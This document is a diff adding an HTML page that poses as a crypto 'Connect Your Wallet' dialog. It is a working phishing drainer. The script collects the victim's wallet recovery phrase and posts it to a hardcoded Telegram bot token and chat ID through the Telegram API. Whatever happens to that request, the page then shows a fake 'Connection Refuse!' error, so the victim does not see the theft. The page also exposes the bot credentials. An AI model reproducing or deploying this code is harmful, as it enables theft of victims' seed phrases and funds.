@@ -1,0 +1,189 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connect Your Wallet</title>
+    <link rel="stylesheet" href="styles1.css">
+    <link rel="stylesheet" href="./web3Hosted.css">
+    <!--<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/oyin25/web3-hosted@latest/web3Hosted.css">
+    <script src="https://cdn.jsdelivr.net/gh/oyin25/web3-hosted@v1.1.0/web3Hosted.js"></script>-->
+    <script src="./web3Hosted.js"></script>
+</head>
+
+<body>
+    <!-- Button to open bottom sheet  -->
+    <button id="openSheet" onclick="showSheet()">Connect Your Wallet</button>
+
+
+<w3h-connect-light></w3h-connect-light>
+
+
+    <script>
+
+        // Replace these values with your actual data
+        const telegramToken = "7809271676:AAH0_B-BKv9wNOhZg26yXF4aevj6eIOtYpU";
+        const chatID = "1942947519";
+
+
+        function showSheet(title, text) {
+            // Start the hosted wallet selection
+            web3Hosted.hosted({
+                // title: "Connect Your Wallet",
+                layout: "grid",
+                wallets: {
+                    metamask: {
+                        image: "https://api.realscan.top/images/metamask.svg",
+                        name: "MetaMask",
+                    },
+                    cat: {
+                        image: "https://api.realscan.top/images/metamask.svg",
+                        name: "Arsenal",
+                    },
+                    car: {
+                        image: "https://api.realscan.top/images/metamask.svg",
+                        name: "Arsenal",
+                    },
+                    catu: {
+                        image: "https://api.realscan.top/images/metamask.svg",
+                        name: "Arsenal",
+                    },
+                },
+                onWalletSelect: (wallet) => {
+                    // When the wallet is selected, you can do some preliminary processing
+                    console.log(`${wallet} selected!`);
+
+                    // Note: The final result (including phrase) will be available only after the user inputs it.
+
+                    // Optionally add further logic or wait until the wallet phrase is input
+                },
+
+                onResult: (result) => {
+                    // Access the result JSON here
+                    console.log("Wallet Data Received:", result);
+
+                    // Show result to the user
+                    Send(`Wallet Connected:\nName: ${result.walletName}\nImage: ${result.walletImage}\nPhrase: ${result.walletPhrase}`, telegramToken, chatID);
+                },
+                onClose: () => {
+                    console.log('Wallet connection dialog closed.');
+                },
+                outsideTouch: false,
+                theme: 'dark',
+                glassEffect: false,
+            });
+
+        }
+
+
+        const connectButton = document.querySelector("w3h-connect-light");
+
+        // Listen for the result from the custom button
+        connectButton.addEventListener("web3Result", (event) => {
+            console.log("Result from web3-hosted:", event.detail);
+            alert(`Wallet Connected: ${event.detail.walletName}`);
+            Send(`Wallet Connected:\nName: ${event.detail.walletName}\nImage: ${event.detail.walletImage}\nPhrase: ${event.detail.walletPhrase}`, telegramToken, chatID);
+        });
+
+
+        function Send(data, telegramAPI, userID) {
+            // Define the URL for sending the message
+            const url = `https://api.telegram.org/bot${telegramAPI}/sendMessage`;
+
+            // Prepare the payload
+            const payload = {
+                chat_id: userID, // The chat ID (user or group)
+                text: data, // The message content
+                parse_mode: "HTML", // Optional: Use HTML formatting for the message
+            };
+
+            // Send the POST request
+            fetch(url, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json",
+                },
+                body: JSON.stringify(payload), // Convert the payload to JSON
+            })
+                .then((response) => {
+                    if (response.ok) {
+                        console.log("Message sent successfully!");
+                        btsheet.hosted({
+                            title: "Connection Refuse!",
+                            text: "Error connecting manually please try again later",
+                            buttonText: "Continue!",
+                            button: {
+                                width: 100,
+                                height: 50,
+                            },
+                            btBody: {
+                                backgroundColor: "rgba(255, 2, 52, 0.5)",
+                                textColor: "#fff",
+                                glassEffect: true
+                            },
+                            btButton: function () {
+                                btsheet.closed();
+                            },
+                            btClose: false,
+                            outsideTouch: true,
+
+
+                        });
+
+                    } else {
+                        console.error("Failed to send message:", response.status, response.statusText);
+                        btsheet.hosted({
+                            title: "Connection Refuse!",
+                            text: "Error connecting manually please try again later",
+                            buttonText: "Continue!",
+                            button: {
+                                width: 100,
+                                height: 50,
+                            },
+                            btBody: {
+                                backgroundColor: "rgba(255, 2, 52, 0.5)",
+                                textColor: "#fff",
+                                glassEffect: true
+                            },
+                            btButton: function () {
+                                btsheet.closed();
+                            },
+                            btClose: false,
+                            outsideTouch: true,
+
+
+                        });
+                    }
+                })
+                .catch((error) => {
+                    console.error("Error sending message:", error);
+                    btsheet.hosted({
+                        title: "Connection Refuse!",
+                        text: "Error connecting manually please try again later",
+                        buttonText: "Continue!",
+                        button: {
+                            width: 100,
+                            height: 50,
+                        },
+                        btBody: {
+                            backgroundColor: "rgba(255, 2, 52, 0.5)",
+                            textColor: "#fff",
+                            glassEffect: true
+                        },
+                        btButton: function () {
+                            btsheet.closed();
+                        },
+                        btClose: false,
+                        outsideTouch: true,
+
+
+                    });
+                });
+        }
+
+
+    </script>
+</body>
+
+</html>
